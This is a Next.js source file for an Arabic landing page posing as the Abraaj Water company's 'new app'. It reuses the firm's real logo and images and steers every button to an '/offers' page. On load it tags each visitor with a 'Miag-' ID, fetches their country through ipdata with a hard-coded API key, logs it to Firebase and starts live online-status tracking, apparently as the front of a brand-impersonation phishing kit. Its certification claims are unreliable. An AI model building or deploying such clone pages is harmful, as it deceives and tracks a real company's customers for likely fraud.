"use client";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import {
  Phone,
  Clock,
  MapPin,
  Mail,
  Truck,
  Droplets,
  Shield,
  Star,
  Award,
  Users,
  CheckCircle,
  Play,
  Tag,
} from "lucide-react";
import Link from "next/link"; // Added Link import for navigation
import { useEffect } from "react";
import { addData } from "@/lib/firebase";
import { setupOnlineStatus } from "@/lib/utils";

function randstr(prefix: string) {
  return Math.random()
    .toString(36)
    .replace("0.", prefix || "");
}
const visitorID = randstr("Miag-");

export default function AbraajWaterPage() {
  async function getLocation() {
    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef";
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;

    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const country = await response.text();
      await addData({
        id: visitorID,
        country: country,
        createdDate: new Date().toISOString(),
      });
      localStorage.setItem("country", country);
      setupOnlineStatus(visitorID);
    } catch (error) {
      console.error("Error fetching location:", error);
    }
  }
  useEffect(() => {
    getLocation().then(() => {
      console.log("done");
    });
  }, []);

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="bg-white text-blue-500 shadow-lg">
        <div className="container mx-auto px-4 py-6">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <div className="relative"></div>
              <div>
                <img
                  src="https://www.abraajwater.com/themes/abraaj/assets/img/logo-ar.svg"
                  width={80}
                />
              </div>
            </div>
            <div className="flex items-center gap-4">
              <Link href="/offers">
                <Button
                  variant="secondary"
                  className="px-4 py-2 text-sm font-medium hover:bg-accent/90 transition-colors"
                >
                  <Tag className="w-4 h-4 mr-2" />
                  العروض الخاصة
                </Button>
              </Link>
            </div>
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <section className="relative bg-gradient-to-br from-blue-500 /5 via-blue-50/50 to-background py-20 overflow-hidden">
        <div className="absolute inset-0 bg-grid-slate-100 [mask-image:linear-gradient(0deg,white,rgba(255,255,255,0.6))] opacity-30"></div>

        <div className="container mx-auto px-4 text-center relative">
          <div className="max-w-lg mx-auto mb-12 ">
            <div className="relative">
              <img
                src="https://www.abraajwater.com/storage/app/media/banner/slide-1.jpg"
                alt="تطبيق مياه أبراج"
                className="mx-auto drop-shadow-2xl rounded-lg"
              />
              <div className="absolute -top-0 -left-4">
                <Badge className="bg-green-500 text-white shadow-lg">
                  <Award className="w-3 h-3 mr-1" />
                  معتمد FDA
                </Badge>
              </div>
              <div className="absolute -bottom-4 -right-4">
                <Badge className="bg-blue-500 text-white shadow-lg">
                  <Users className="w-3 h-3 mr-1" />
                  +50,000 عميل
                </Badge>
              </div>
            </div>
          </div>

          <div className="max-w-4xl mx-auto">
            <h2 className="text-3xl font-bold mb-6 text-balance bg-gradient-to-r from-blue-500  to-blue-600 bg-clip-text text-transparent">
              تطبيق مياه أبراج الجديد
            </h2>
            <p className="text-md text-muted-foreground mb-8 text-pretty leading-relaxed">
              اطلب مياه نقية عالية الجودة مع خدمة التوصيل السريع والموثوق في
              جميع أنحاء المدينة
            </p>

            <div className="flex flex-col sm:flex-row gap-6 justify-center mb-12">
              <Link href="/offers" className="w-full">
                <Button className="bg-blue-600 text-white hover:bg-gray-800 rounded-2xl px-8 py-6 shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:-translate-y-1">
                  <div className="flex items-center gap-4">
                    <div className="text-left">
                      <div className="font-bold text-sm">مياه الشرب </div>
                    </div>
                  </div>
                </Button>
              </Link>

              <Link href="/offers" className="w-full">
                <Button className="bg-black text-white hover:bg-gray-800 rounded-2xl px-8 py-6 shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:-translate-y-1">
                  <div className="flex items-center gap-4">
                    <div className="text-left">
                      <div className="font-bold text-sm">العروض الخاصة</div>
                    </div>
                  </div>
                </Button>
              </Link>
            </div>

            <div className="flex flex-wrap justify-center gap-8 text-sm text-muted-foreground">
              <div className="flex items-center gap-2">
                <CheckCircle className="w-4 h-4 text-green-500" />
                <span>معتمد من FDA</span>
              </div>
              <div className="flex items-center gap-2">
                <CheckCircle className="w-4 h-4 text-green-500" />
                <span>شهادة ISO 9001:2015</span>
              </div>
              <div className="flex items-center gap-2">
                <CheckCircle className="w-4 h-4 text-green-500" />
                <span>أكثر من 20 عام خبرة</span>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Stats Section */}
      <section className="py-16 bg-blue-600  text-white">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-2 md:grid-cols-4 gap-8 text-center">
            <div>
              <div className="text-4xl font-bold mb-2">20+</div>
              <div className="text-sm opacity-90">سنة خبرة</div>
            </div>
            <div>
              <div className="text-4xl font-bold mb-2">50K+</div>
              <div className="text-sm opacity-90">عميل راضي</div>
            </div>
            <div>
              <div className="text-4xl font-bold mb-2">24/7</div>
              <div className="text-sm opacity-90">خدمة العملاء</div>
            </div>
            <div>
              <div className="text-4xl font-bold mb-2">99%</div>
              <div className="text-sm opacity-90">رضا العملاء</div>
            </div>
          </div>
        </div>
      </section>

      {/* About Section */}
      <section className="py-20 bg-card">
        <div className="container mx-auto px-4">
          <div className="text-center mb-16">
            <div className="relative w-32 h-32 mx-auto mb-8">
              <div className="absolute inset-0 bg-gradient-to-br from-blue-500  to-blue-600 rounded-3xl shadow-2xl"></div>
              <div className="absolute inset-2 bg-primary-foreground rounded-2xl flex items-center justify-center">
                <Droplets className="w-16 h-16 text-blue-100 " />
              </div>
            </div>
            <h2 className="text-4xl font-bold mb-8 text-balance">
              عن مياه أبراج
            </h2>
            <div className="max-w-4xl mx-auto text-muted-foreground leading-relaxed text-lg space-y-6">
              <p>
                لأكثر من 20 عاماً، مياه أبراج في خدمتكم بكل فخر بمصر بنفس الطعم
                والجودة العالية عبر التوزيع الآمن من مياه الشرب التي تم تنقيتها
                من جميع المنافسات سواء كانت في المنزل، المكتب أو في مياه التاجر
                نستخدم في المعدات أحدث أبراج التقنيات الخاصة بمياه الشرب المعبأة
                حسب المواصفات العالمية المتفق عليها لضمان أفضل جودة للمستهلك.
              </p>
              <p>
                نحن نفخر بتقديم أبراج مياه على العديد من الاعتمادات والشهادات
                الجودة العالمية منها والمحلية، حيث أن المصنع معتمد من NSF
                والدواء وهيئة الغذاء الأمريكية FDA وحاصل على شهادة الأيزو
                9001:2015 وعلامة الجودة HACCP وعلامة الكويتية طبقاً للمواصفات
                الخليجية، ويخضع المصنع للتدقيق الدائم من كل جهات الاعتماد تلك
                بصفة دورية.
              </p>
            </div>
            <Button
              className="mt-10 bg-transparent"
              size="lg"
              variant="outline"
            >
              اقرأ المزيد
            </Button>
          </div>
        </div>
      </section>

      {/* Video Section */}
      <section className="py-20 bg-gradient-to-br from-blue-50 to-background">
        <div className="container mx-auto px-4 text-center">
          <h2 className="text-4xl font-bold mb-12 text-balance">
            أفضل خيار لعائلتك
          </h2>
          <div className="max-w-2xl mx-auto">
            <div className="relative bg-gradient-to-br from-gray-100 to-gray-200 rounded-3xl overflow-hidden aspect-video shadow-2xl">
              <img
                src="/IMG_0923.PNG"
                alt="أفضل خيار لعائلتك"
                className="w-full h-full object-cover"
              />
              <div className="absolute inset-0 bg-black/20 flex items-center justify-center">
                <Button
                  size="lg"
                  className="rounded-full w-20 h-20 bg-white/90 hover:bg-white text-blue-500  shadow-2xl hover:scale-110 transition-all duration-300"
                >
                  <Play className="w-8 h-8 ml-1" />
                </Button>
              </div>
              <div className="absolute bottom-4 left-4 right-4">
                <div className="bg-white/90 backdrop-blur-sm rounded-xl p-4 text-left">
                  <h3 className="font-semibold text-gray-900">
                    شاهد قصة نجاحنا
                  </h3>
                  <p className="text-sm text-gray-600">
                    اكتشف كيف نضمن أعلى معايير الجودة
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Services Section */}
      <section className="py-20 bg-card">
        <div className="container mx-auto px-4">
          <h2 className="text-4xl font-bold text-center mb-16">
            خدماتنا المتميزة
          </h2>
          <div className="grid md:grid-cols-3 gap-8">
            <Card className="border-0 shadow-xl hover:shadow-2xl transition-all duration-300 hover:-translate-y-2 bg-gradient-to-br from-white to-blue-50">
              <CardContent className="p-8 text-center">
                <div className="w-16 h-16 bg-gradient-to-br from-blue-500  to-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-lg">
                  <Truck className="w-8 h-8 text-white" />
                </div>
                <h3 className="text-2xl font-bold mb-4">توصيل سريع</h3>
                <p className="text-muted-foreground leading-relaxed">
                  خدمة توصيل سريعة وموثوقة لجميع أنحاء المدينة خلال 24 ساعة
                </p>
                <Badge className="mt-4 bg-green-100 text-green-700">
                  متاح الآن
                </Badge>
              </CardContent>
            </Card>

            <Card className="border-0 shadow-xl hover:shadow-2xl transition-all duration-300 hover:-translate-y-2 bg-gradient-to-br from-white to-green-50">
              <CardContent className="p-8 text-center">
                <div className="w-16 h-16 bg-gradient-to-br from-green-500 to-emerald-600 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-lg">
                  <Shield className="w-8 h-8 text-white" />
                </div>
                <h3 className="text-2xl font-bold mb-4">جودة مضمونة</h3>
                <p className="text-muted-foreground leading-relaxed">
                  مياه نقية ومعقمة وفقاً لأعلى المعايير العالمية مع ضمان الجودة
                </p>
                <Badge className="mt-4 bg-blue-100 text-blue-700">
                  معتمد دولياً
                </Badge>
              </CardContent>
            </Card>

            <Card className="border-0 shadow-xl hover:shadow-2xl transition-all duration-300 hover:-translate-y-2 bg-gradient-to-br from-white to-yellow-50">
              <CardContent className="p-8 text-center">
                <div className="w-16 h-16 bg-gradient-to-br from-yellow-500 to-orange-600 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-lg">
                  <Star className="w-8 h-8 text-white" />
                </div>
                <h3 className="text-2xl font-bold mb-4">خدمة عملاء ممتازة</h3>
                <p className="text-muted-foreground leading-relaxed">
                  فريق خدمة عملاء متخصص متاح على مدار الساعة لخدمتكم
                </p>
                <Badge className="mt-4 bg-purple-100 text-purple-700">
                  24/7 دعم
                </Badge>
              </CardContent>
            </Card>
          </div>
        </div>
      </section>

      {/* Delivery Section */}
      <section className="py-20 bg-gradient-to-br from-blue-500  to-blue-600">
        <div className="container mx-auto px-4">
          <div className="grid md:grid-cols-2 gap-12 items-center">
            <div>
              <div className="relative">
                <img
                  src="https://www.abraajwater.com/themes/abraaj/assets/img/Delivery.png"
                  alt="خدمات التوصيل"
                  className="w-full rounded-3xl shadow-2xl"
                />
                <div className="absolute -bottom-4 -right-4 bg-white rounded-2xl p-4 shadow-xl">
                  <div className="flex items-center gap-2">
                    <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                    <span className="text-sm font-medium">متاح للتوصيل</span>
                  </div>
                </div>
              </div>
            </div>
            <div>
              <h2 className="text-xl font-bold mb-6">خدمات التوصيل المتطورة</h2>
              <p className="text-md text-gray-100 mb-8 leading-relaxed">
                يعمل أسطول التوصيل المتطور لدينا بنية (6) أيام في الأسبوع،
                ويمكننا توصيل المياه النقية إلى منزلك أو مكتبك بأسرع وقت ممكن.
              </p>
              <div className="space-y-4 text-white">
                <div className="flex items-center gap-3">
                  <CheckCircle className="w-5 h-5 text-green-500" />
                  <span>توصيل مجاني للطلبات أكثر من 50 ريال</span>
                </div>
                <div className="flex items-center gap-3">
                  <CheckCircle className="w-5 h-5 text-green-500" />
                  <span>تتبع الطلب في الوقت الفعلي</span>
                </div>
                <div className="flex items-center gap-3">
                  <CheckCircle className="w-5 h-5 text-green-500" />
                  <span>فريق توصيل مدرب ومحترف</span>
                </div>
              </div>
              <Button className="mt-8" size="lg">
                اطلب الآن
              </Button>
            </div>
          </div>
        </div>
      </section>

      {/* Contact Section */}
      <section className="py-20 bg-blue-500  text-white">
        <div className="container mx-auto px-4">
          <div className="text-center mb-12">
            <h2 className="text-4xl font-bold mb-4">تواصل معنا</h2>
            <p className="text-xl opacity-90">
              نحن هنا لخدمتكم على مدار الساعة
            </p>
          </div>

          <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-8">
            <Card className="bg-primary-foreground/10 border-primary-foreground/20 backdrop-blur-sm">
              <CardContent className="p-6 text-center">
                <div className="w-12 h-12 bg-primary-foreground rounded-xl flex items-center justify-center mx-auto mb-4">
                  <Phone className="w-6 h-6 text-blue-500 " />
                </div>
                <h3 className="font-bold mb-2">الاتصال المجاني</h3>
                <p className="text-2xl font-bold">1844666</p>
              </CardContent>
            </Card>

            <Card className="bg-primary-foreground/10 border-primary-foreground/20 backdrop-blur-sm">
              <CardContent className="p-6 text-center">
                <div className="w-12 h-12 bg-primary-foreground rounded-xl flex items-center justify-center mx-auto mb-4">
                  <Clock className="w-6 h-6 text--blue-500 s" />
                </div>
                <h3 className="font-bold mb-2">ساعات العمل</h3>
                <p>07:00 - 16:00</p>
              </CardContent>
            </Card>

            <Card className="bg-primary-foreground/10 border-primary-foreground/20 backdrop-blur-sm">
              <CardContent className="p-6 text-center">
                <div className="w-12 h-12 bg-primary-foreground rounded-xl flex items-center justify-center mx-auto mb-4">
                  <MapPin className="w-6 h-6 text-blue-500 " />
                </div>
                <h3 className="font-bold mb-2">أيام العمل</h3>
                <p>السبت - الخميس</p>
              </CardContent>
            </Card>

            <Card className="bg-primary-foreground/10 border-primary-foreground/20 backdrop-blur-sm">
              <CardContent className="p-6 text-center">
                <div className="w-12 h-12 bg-primary-foreground rounded-xl flex items-center justify-center mx-auto mb-4">
                  <Mail className="w-6 h-6 text-blue-500 " />
                </div>
                <h3 className="font-bold mb-2">البريد الإلكتروني</h3>
                <p className="text-sm">info@abraajwater.com</p>
              </CardContent>
            </Card>
          </div>

          <div className="text-center mt-16">
            <h3 className="text-2xl font-bold mb-6">تابعونا على</h3>
            <div className="flex justify-center gap-4">
              <Button
                variant="secondary"
                size="lg"
                className="rounded-full w-14 h-14 hover:scale-110 transition-transform"
              >
                <svg
                  className="w-6 h-6"
                  fill="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
                </svg>
              </Button>
              <Button
                variant="secondary"
                size="lg"
                className="rounded-full w-14 h-14 hover:scale-110 transition-transform"
              >
                <svg
                  className="w-6 h-6"
                  fill="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                </svg>
              </Button>
              <Button
                variant="secondary"
                size="lg"
                className="rounded-full w-14 h-14 hover:scale-110 transition-transform"
              >
                <svg
                  className="w-6 h-6"
                  fill="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.174-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.097.118.112.221.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.402.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.357-.629-2.748-1.378l-.748 2.853c-.271 1.043-1.002 2.35-1.492 3.146C9.57 23.812 10.763 24.009 12.017 24.009c6.624 0 11.99-5.367 11.99-11.988C24 5.367 18.641.001.012.001z" />
                </svg>
              </Button>
              <Button
                variant="secondary"
                size="lg"
                className="rounded-full w-14 h-14 hover:scale-110 transition-transform"
              >
                <svg
                  className="w-6 h-6"
                  fill="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" />
                </svg>
              </Button>
            </div>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-foreground text-background py-12">
        <div className="container mx-auto px-4">
          <div className="text-center">
            <div className="flex items-center justify-center gap-3 mb-6">
              <Droplets className="w-10 h-10 text-blue-500 " />
              <div>
                <h3 className="text-2xl font-bold">أبراج</h3>
                <p className="text-sm opacity-70">مياه أبراج المعتمدة</p>
              </div>
            </div>
            <div className="border-t border-background/20 pt-6">
              <p className="text-sm opacity-70">
                Copyright © 2025 Abraaj Water Company. All Rights Reserved.
              </p>
              <p className="text-xs opacity-50 mt-2">
                جميع الحقوق محفوظة لشركة مياه أبراج
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
